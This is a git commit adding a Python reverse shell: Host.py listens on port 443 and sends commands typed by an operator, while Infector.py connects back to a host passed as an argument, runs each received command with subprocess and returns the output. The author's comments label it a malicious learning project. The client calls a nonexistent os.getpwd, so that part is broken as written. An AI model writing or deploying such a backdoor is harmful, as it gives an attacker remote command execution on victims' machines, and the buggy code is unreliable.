3e5340c081df02e01b9f1b6b987ff7bd8d8b55d4
red2922 <jinthavongsa1@gmail.com>
2023-05-02 10:19:09 -0500

    Put in the rest of the code and converted to Linux

--- Host.py
+++ Host.py
@@ -1,6 +1,5 @@
 import socket
-import os
-import time 
+
 
 #THIS IS A MALICIOUS PROJECT. ONCE COMPLETED PLEASE DO NOT OPEN ON YOU PERSONAL MACHINE 
 #This is currently for a windows OS but I would like to change it to a Linux. This a majorly a test to see what we can learn from 
@@ -11,12 +10,36 @@ Host = "0.0.0.0"
 Port = 443
 Max_Size = 1024 * 128
 
-SEPERATOR = "<sep>"
-
-
+SEPARATOR = "<sep>"
 
 
 s = socket.socket()
 
 s.bind((Host,Port))
 
+s.listen(5)
+print(f"Listening as {Host}:{Port} ...")
+
+client_socket, client_address = s.accept()
+print(f"{client_address[0]}:{client_address[1]} Connected!")
+
+pwd = client_socket.recv(Max_Size).decode()
+print("[+] Current working directory:", pwd)
+
+while True:
+    # get the command from prompt
+    command = input(f"{pwd} $> ")
+    if not command.strip():
+        # empty command
+        continue
+    # send the command to the client
+    client_socket.send(command.encode())
+    if command.lower() == "exit":
+        # if the command is exit, just break out of the loop
+        break
+    # retrieve command results
+    output = client_socket.recv(Max_Size).decode()
+    # split command output and current directory
+    results, pwd = output.split(SEPARATOR)
+    # print output
+    print(results)
---
+++ Infector.py
@@ -0,0 +1,46 @@
+import socket
+import os
+import subprocess
+import sys
+
+SERVER_HOST = sys.argv[1]
+SERVER_PORT = 443
+BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
+# separator string for sending 2 messages in one go
+SEPARATOR = "<sep>"
+
+# create the socket object
+s = socket.socket()
+# connect to the server
+s.connect((SERVER_HOST, SERVER_PORT))
+
+pwd = os.getpwd()
+s.send(pwd.encode())
+
+while True:
+    # receive the command from the server
+    command = s.recv(BUFFER_SIZE).decode()
+    splited_command = command.split()
+    if command.lower() == "exit":
+        # if the command is exit, just break out of the loop
+        break
+    if splited_command[0].lower() == "cd":
+        # cd command, change directory
+        try:
+            os.chdir(' '.join(splited_command[1:]))
+        except FileNotFoundError as e:
+            # if there is an error, set as the output
+            output = str(e)
+        else:
+            # if operation is successful, empty message
+            output = ""
+    else:
+        # execute the command and retrieve the results
+        output = subprocess.getoutput(command)
+    # get the current working directory as output
+    pwd = os.getpwd()
+    # send the results back to the server
+    message = f"{output}{SEPARATOR}{pwd}"
+    s.send(message.encode())
+# close client connection
+s.close()
